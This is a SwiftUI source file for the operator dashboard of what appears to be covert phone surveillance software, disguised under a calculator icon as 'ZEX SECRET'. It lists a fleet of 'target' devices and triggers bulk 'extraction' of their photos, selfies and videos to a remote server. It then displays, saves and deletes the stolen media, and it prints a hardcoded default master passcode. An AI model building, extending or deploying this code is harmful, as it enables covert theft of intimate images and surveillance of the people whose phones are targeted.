import SwiftUI
import AVKit

struct AdminDashboardView: View {
    @StateObject private var admin = AdminEngine.shared

    @State private var passcode = ""
    @State private var authError = false

    @State private var selectedAlbum = "all"
    @State private var selectedCount = 25
    @State private var skipExisting = true

    @State private var selectedMedia: VaultMediaItem? = nil
    @State private var saveSuccessAlert = false

    var body: some View {
        ZStack {
            Color(red: 0.04, green: 0.04, blue: 0.06).edgesIgnoringSafeArea(.all)

            if !admin.isAuthenticated {
                authLoginView
            } else {
                mainDashboardView
            }
        }
        .preferredColorScheme(.dark)
    }

    // MARK: - 1. Cyber Passcode Authentication Screen
    private var authLoginView: some View {
        VStack(spacing: 22) {
            Spacer()

            ZStack {
                Circle()
                    .fill(Color.green.opacity(0.12))
                    .frame(width: 80, height: 80)
                Image(systemName: "shield.checkered")
                    .font(.system(size: 40))
                    .foregroundColor(.green)
            }

            VStack(spacing: 6) {
                Text("ZEX MASTER ACCESS")
                    .font(.system(size: 18, weight: .bold, design: .monospaced))
                    .foregroundColor(.white)
                Text("SECURE ADMIN CONTROLLER")
                    .font(.system(size: 11, design: .monospaced))
                    .foregroundColor(.gray)
            }

            VStack(spacing: 12) {
                SecureField("Enter Master Passcode", text: $passcode)
                    .font(.system(size: 16, weight: .bold, design: .monospaced))
                    .multilineTextAlignment(.center)
                    .padding()
                    .background(Color.black.opacity(0.6))
                    .cornerRadius(12)
                    .overlay(RoundedRectangle(cornerRadius: 12).stroke(Color.white.opacity(0.15), lineWidth: 1))
                    .foregroundColor(.green)

                if authError {
                    Text("Invalid Master Passcode")
                        .font(.caption)
                        .foregroundColor(.red)
                }

                Button(action: {
                    admin.authenticate(key: passcode) { success in
                        authError = !success
                    }
                }) {
                    Text("UNLOCK CONSOLE")
                        .font(.system(size: 13, weight: .heavy))
                        .foregroundColor(.black)
                        .frame(maxWidth: .infinity)
                        .padding(.vertical, 15)
                        .background(Color.green)
                        .cornerRadius(12)
                        .shadow(color: Color.green.opacity(0.3), radius: 8)
                }
            }
            .padding(.horizontal, 36)

            Text("Default: zex786")
                .font(.system(size: 11, design: .monospaced))
                .foregroundColor(.gray)

            Spacer()

            // Signature Footer
            Text("TABIxGUJJAR")
                .font(.system(size: 12, weight: .heavy, design: .monospaced))
                .foregroundColor(.green)
                .padding(.bottom, 16)
        }
    }

    // MARK: - 2. Main Dashboard (Exact Web Layout)
    private var mainDashboardView: some View {
        VStack(spacing: 0) {
            // Header
            HStack {
                HStack(spacing: 10) {
                    ZStack {
                        RoundedRectangle(cornerRadius: 8)
                            .fill(LinearGradient(colors: [.green, .cyan], startPoint: .topLeading, endPoint: .bottomTrailing))
                            .frame(width: 34, height: 34)
                        Image(systemName: "calculator")
                            .font(.system(size: 16, weight: .bold))
                            .foregroundColor(.black)
                    }

                    VStack(alignment: .leading, spacing: 2) {
                        HStack(spacing: 6) {
                            Text("ZEX SECRET")
                                .font(.system(size: 14, weight: .bold))
                                .foregroundColor(.white)
                            Text("v2.5 SECURE")
                                .font(.system(size: 9, weight: .bold, design: .monospaced))
                                .foregroundColor(.green)
                                .padding(.horizontal, 5)
                                .padding(.vertical, 2)
                                .background(Color.green.opacity(0.12))
                                .cornerRadius(4)
                        }
                        Text("DYNAMIC SLOTS & TELEMETRY")
                            .font(.system(size: 9, design: .monospaced))
                            .foregroundColor(.gray)
                    }
                }

                Spacer()

                // Device Switcher Menu
                if !admin.devices.isEmpty {
                    Menu {
                        ForEach(admin.devices) { dev in
                            Button(action: { admin.selectDevice(dev) }) {
                                Text("\(dev.name) (\(dev.id)) - " + (dev.isOnline ? "🟢 Online" : "🔴 Offline"))
                            }
                        }
                    } label: {
                        HStack(spacing: 4) {
                            Text(admin.selectedDevice?.id ?? "SELECT")
                                .font(.system(size: 11, weight: .bold, design: .monospaced))
                            Image(systemName: "chevron.down")
                                .font(.system(size: 10))
                        }
                        .foregroundColor(.green)
                        .padding(.horizontal, 10)
                        .padding(.vertical, 6)
                        .background(Color.white.opacity(0.06))
                        .cornerRadius(8)
                    }
                }
            }
            .padding(.horizontal, 16)
            .padding(.vertical, 12)
            .background(Color(red: 0.06, green: 0.07, blue: 0.09))

            ScrollView {
                VStack(spacing: 16) {
                    // Fleet Summary Cards
                    if admin.devices.count > 1 {
                        VStack(alignment: .leading, spacing: 8) {
                            Text("CONNECTED TARGET FLEET (\(admin.devices.count))")
                                .font(.system(size: 10, weight: .bold, design: .monospaced))
                                .foregroundColor(.gray)

                            ScrollView(.horizontal, showsIndicators: false) {
                                HStack(spacing: 10) {
                                    ForEach(admin.devices) { dev in
                                        Button(action: { admin.selectDevice(dev) }) {
                                            HStack(spacing: 8) {
                                                Circle()
                                                    .fill(dev.isOnline ? Color.green : Color.red)
                                                    .frame(width: 8, height: 8)
                                                VStack(alignment: .leading, spacing: 1) {
                                                    Text(dev.id)
                                                        .font(.system(size: 11, weight: .bold, design: .monospaced))
                                                        .foregroundColor(.white)
                                                    Text("\(dev.stats?.battery ?? 100)%" + ((dev.stats?.isCharging ?? false) ? " ⚡" : ""))
                                                        .font(.system(size: 9, design: .monospaced))
                                                        .foregroundColor(.gray)
                                                }
                                            }
                                            .padding(.horizontal, 12)
                                            .padding(.vertical, 8)
                                            .background(dev.id == admin.selectedDevice?.id ? Color.green.opacity(0.15) : Color.white.opacity(0.04))
                                            .cornerRadius(10)
                                            .overlay(RoundedRectangle(cornerRadius: 10).stroke(dev.id == admin.selectedDevice?.id ? Color.green : Color.clear, lineWidth: 1))
                                        }
                                    }
                                }
                            }
                        }
                    }

                    // Live Telemetry Grid
                    if let dev = admin.selectedDevice {
                        LazyVGrid(columns: [GridItem(.flexible()), GridItem(.flexible())], spacing: 10) {
                            telemetryCard(
                                title: "DEVICE STATUS",
                                value: dev.isOnline ? "ONLINE 24/7" : "OFFLINE",
                                color: dev.isOnline ? .green : .red,
                                icon: dev.isOnline ? "circle.fill" : "circle"
                            )

                            telemetryCard(
                                title: "BATTERY TELEMETRY",
                                value: "\(dev.stats?.battery ?? 100)%" + ((dev.stats?.isCharging ?? false) ? " ⚡" : ""),
                                color: .white,
                                icon: "battery.75"
                            )

                            telemetryCard(
                                title: "DEVICE PHOTOS",
                                value: "\(dev.stats?.photosCount ?? 0)",
                                color: .green,
                                icon: "photo.fill"
                            )

                            telemetryCard(
                                title: "DEVICE VIDEOS",
                                value: "\(dev.stats?.videosCount ?? 0)",
                                color: .cyan,
                                icon: "video.fill"
                            )
                        }
                    }

                    // High-Speed Command Center
                    VStack(alignment: .leading, spacing: 14) {
                        Text("HIGH-SPEED COMMAND CENTER")
                            .font(.system(size: 11, weight: .bold, design: .monospaced))
                            .foregroundColor(.white)

                        // Album Picker
                        VStack(alignment: .leading, spacing: 4) {
                            Text("TARGET ALBUM:")
                                .font(.system(size: 10, weight: .semibold, design: .monospaced))
                                .foregroundColor(.gray)

                            Picker("Album", selection: $selectedAlbum) {
                                Text("All Photos & Videos").tag("all")
                                Text("Screenshots").tag("screenshots")
                                Text("Camera Roll").tag("camera_roll")
                                Text("Favorites").tag("favorites")
                                Text("Videos Only").tag("videos")
                                Text("Selfies").tag("selfies")
                            }
                            .pickerStyle(MenuPickerStyle())
                            .padding(.horizontal, 12)
                            .padding(.vertical, 8)
                            .frame(maxWidth: .infinity, alignment: .leading)
                            .background(Color.black.opacity(0.5))
                            .cornerRadius(10)
                        }

                        // Count Pills
                        VStack(alignment: .leading, spacing: 6) {
                            Text("EXTRACTION COUNT:")
                                .font(.system(size: 10, weight: .semibold, design: .monospaced))
                                .foregroundColor(.gray)

                            HStack(spacing: 8) {
                                ForEach([10, 25, 50, 100, -1], id: \.self) { cnt in
                                    Button(action: { selectedCount = cnt }) {
                                        Text(cnt == -1 ? "ALL" : "\(cnt)")
                                            .font(.system(size: 11, weight: .bold, design: .monospaced))
                                            .foregroundColor(selectedCount == cnt ? .green : .gray)
                                            .frame(maxWidth: .infinity)
                                            .padding(.vertical, 8)
                                            .background(selectedCount == cnt ? Color.green.opacity(0.15) : Color.white.opacity(0.04))
                                            .cornerRadius(8)
                                            .overlay(RoundedRectangle(cornerRadius: 8).stroke(selectedCount == cnt ? Color.green : Color.white.opacity(0.08), lineWidth: 1))
                                    }
                                }
                            }
                        }

                        // Skip Existing Toggle
                        Toggle(isOn: $skipExisting) {
                            Text("Skip Previously Synced Files")
                                .font(.system(size: 12))
                                .foregroundColor(.gray)
                        }
                        .toggleStyle(SwitchToggleStyle(tint: .green))

                        // Trigger Button
                        Button(action: {
                            admin.sendExtractionCommand(album: selectedAlbum, count: selectedCount, skipExisting: skipExisting)
                        }) {
                            HStack(spacing: 6) {
                                Image(systemName: "bolt.fill")
                                Text("TRIGGER HIGH-SPEED EXTRACTION")
                            }
                            .font(.system(size: 13, weight: .heavy))
                            .foregroundColor(.black)
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 14)
                            .background(Color.green)
                            .cornerRadius(12)
                            .shadow(color: Color.green.opacity(0.25), radius: 8)
                        }
                    }
                    .padding()
                    .background(Color.white.opacity(0.04))
                    .cornerRadius(16)
                    .overlay(RoundedRectangle(cornerRadius: 16).stroke(Color.green.opacity(0.2), lineWidth: 1))

                    // Live Progress Card
                    if admin.isProgressVisible {
                        VStack(alignment: .leading, spacing: 8) {
                            HStack {
                                Text("Syncing \(admin.progressCurrent) of \(admin.progressTotal) items...")
                                    .font(.system(size: 11, design: .monospaced))
                                    .foregroundColor(.white)
                                Spacer()
                                Text(admin.progressSpeed)
                                    .font(.system(size: 10, weight: .bold, design: .monospaced))
                                    .foregroundColor(.green)
                                Text("(\(admin.progressETA))")
                                    .font(.system(size: 10, design: .monospaced))
                                    .foregroundColor(.gray)
                            }

                            GeometryReader { g in
                                ZStack(alignment: .leading) {
                                    RoundedRectangle(cornerRadius: 6).fill(Color.white.opacity(0.1))
                                    RoundedRectangle(cornerRadius: 6).fill(Color.green)
                                        .frame(width: max(0, g.size.width * CGFloat(admin.progressPercent / 100.0)))
                                }
                            }
                            .frame(height: 8)
                        }
                        .padding()
                        .background(Color.white.opacity(0.06))
                        .cornerRadius(12)
                    }

                    // Stored Media Grid
                    VStack(alignment: .leading, spacing: 12) {
                        HStack {
                            Text("STORED VAULT MEDIA (\(admin.vaultMedia.count))")
                                .font(.system(size: 11, weight: .bold, design: .monospaced))
                                .foregroundColor(.white)
                            Spacer()
                            Button(action: { admin.fetchMedia() }) {
                                Image(systemName: "arrow.clockwise")
                                    .font(.system(size: 12))
                                    .foregroundColor(.green)
                            }
                        }

                        if admin.vaultMedia.isEmpty {
                            Text("No extracted media yet. Use the command center above.")
                                .font(.system(size: 11))
                                .foregroundColor(.gray)
                                .frame(maxWidth: .infinity, alignment: .center)
                                .padding(.vertical, 24)
                        } else {
                            LazyVGrid(columns: [GridItem(.adaptive(minimum: 100), spacing: 8)], spacing: 8) {
                                ForEach(admin.vaultMedia) { item in
                                    ZStack {
                                        AsyncImage(url: URL(string: "\(admin.serverURL)\(item.url)")) { phase in
                                            if let img = phase.image {
                                                img.resizable().scaledToFill()
                                                    .frame(width: 100, height: 100)
                                                    .clipped()
                                                    .cornerRadius(8)
                                            } else {
                                                Color.white.opacity(0.05)
                                                    .frame(width: 100, height: 100)
                                                    .cornerRadius(8)
                                            }
                                        }

                                        if item.type == "video" {
                                            Circle()
                                                .fill(Color.black.opacity(0.6))
                                                .frame(width: 28, height: 28)
                                            Image(systemName: "play.fill")
                                                .font(.system(size: 11))
                                                .foregroundColor(.white)
                                        }
                                    }
                                    .onTapGesture {
                                        selectedMedia = item
                                    }
                                }
                            }
                        }
                    }
                    .padding()
                    .background(Color.white.opacity(0.04))
                    .cornerRadius(16)

                    // User Signature Footer
                    VStack(spacing: 4) {
                        Text("TABIxGUJJAR")
                            .font(.system(size: 14, weight: .heavy, design: .monospaced))
                            .foregroundColor(.green)
                            .tracking(2)
                        Text("MASTER VAULT CONTROLLER")
                            .font(.system(size: 9, design: .monospaced))
                            .foregroundColor(.gray)
                    }
                    .padding(.vertical, 20)
                }
                .padding(16)
            }
        }
        .sheet(item: $selectedMedia) { item in
            mediaViewerSheet(item: item)
        }
        .alert(isPresented: $saveSuccessAlert) {
            Alert(title: Text("Saved"), message: Text("Saved to iPhone Camera Roll!"), dismissButton: .default(Text("OK")))
        }
    }

    // MARK: - Telemetry Card Helper
    private func telemetryCard(title: String, value: String, color: Color, icon: String) -> some View {
        VStack(alignment: .leading, spacing: 4) {
            Text(title)
                .font(.system(size: 9, weight: .bold, design: .monospaced))
                .foregroundColor(.gray)
            HStack(spacing: 6) {
                Image(systemName: icon)
                    .font(.system(size: 11))
                    .foregroundColor(color)
                Text(value)
                    .font(.system(size: 13, weight: .bold, design: .monospaced))
                    .foregroundColor(color)
            }
        }
        .padding(12)
        .frame(maxWidth: .infinity, alignment: .leading)
        .background(Color.white.opacity(0.04))
        .cornerRadius(12)
    }

    // MARK: - Lightbox Media Viewer
    private func mediaViewerSheet(item: VaultMediaItem) -> some View {
        ZStack {
            Color.black.edgesIgnoringSafeArea(.all)

            VStack {
                HStack {
                    Spacer()
                    Button(action: { selectedMedia = nil }) {
                        Image(systemName: "xmark.circle.fill")
                            .font(.system(size: 24))
                            .foregroundColor(.gray)
                    }
                }
                .padding()

                Spacer()

                if item.type == "video", let url = URL(string: "\(admin.serverURL)\(item.url)") {
                    VideoPlayer(player: AVPlayer(url: url))
                        .frame(maxHeight: 400)
                } else {
                    AsyncImage(url: URL(string: "\(admin.serverURL)\(item.url)")) { phase in
                        if let img = phase.image {
                            img.resizable().scaledToFit()
                        } else {
                            ProgressView()
                        }
                    }
                }

                Spacer()

                HStack(spacing: 16) {
                    Button(action: {
                        admin.saveToCameraRoll(item: item) { success in
                            if success { saveSuccessAlert = true }
                        }
                    }) {
                        HStack(spacing: 6) {
                            Image(systemName: "arrow.down.to.line")
                            Text("Save to Camera Roll")
                        }
                        .font(.system(size: 13, weight: .bold))
                        .foregroundColor(.black)
                        .padding(.horizontal, 18)
                        .padding(.vertical, 12)
                        .background(Color.green)
                        .cornerRadius(10)
                    }

                    Button(action: {
                        admin.deleteMedia(filename: item.filename)
                        selectedMedia = nil
                    }) {
                        Image(systemName: "trash")
                            .font(.system(size: 15))
                            .foregroundColor(.red)
                            .padding(12)
                            .background(Color.white.opacity(0.1))
                            .cornerRadius(10)
                    }
                }
                .padding(.bottom, 24)
            }
        }
    }
}
